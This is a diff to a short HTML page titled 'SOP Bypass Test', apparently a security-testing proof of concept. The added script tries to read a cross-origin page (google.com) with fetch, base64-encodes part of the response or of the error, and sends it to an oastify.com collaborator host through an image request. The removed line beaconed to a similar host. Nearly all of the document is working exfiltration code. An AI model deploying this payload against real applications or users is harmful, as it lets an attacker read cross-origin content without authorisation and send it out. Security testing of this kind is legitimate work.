@@ -1,8 +1,28 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>SOP Bypass Test</title>
+</head>
 <body>
-<script>
-new Image().src = 'http://oum9a9ym9rcjam1xeq3fk21ec5iw6mub.oastify.com/zoom-js-proof-' + Math.random();
-</script>
+    <script>
+        const targetUrl = 'https://www.google.com';
+        const collaboratorUrl = 'http://geypbelgf5pfqiviw5d9d9cu5lbcz2nr.oastify.com';
+        fetch(targetUrl, { mode: 'cors' })
+            .then(response => {
+                // If it succeeds, grab the raw text/HTML content
+                return response.text();
+            })
+            .then(htmlContent => {
+                // Encode the first 200 characters to base64 so it fits cleanly in a URL
+                const safeData = btoa(htmlContent.substring(0, 200));
+                // Send it to your collaborator
+                new Image().src = collaboratorUrl + safeData;
+            })
+            .catch(error => {
+                // If standard security blocks it, catch the error message and send that instead
+                const errorData = btoa('BLOCKED: ' + error.message);
+                new Image().src = collaboratorUrl + errorData;
+            });
+    </script>
 </body>
 </html>
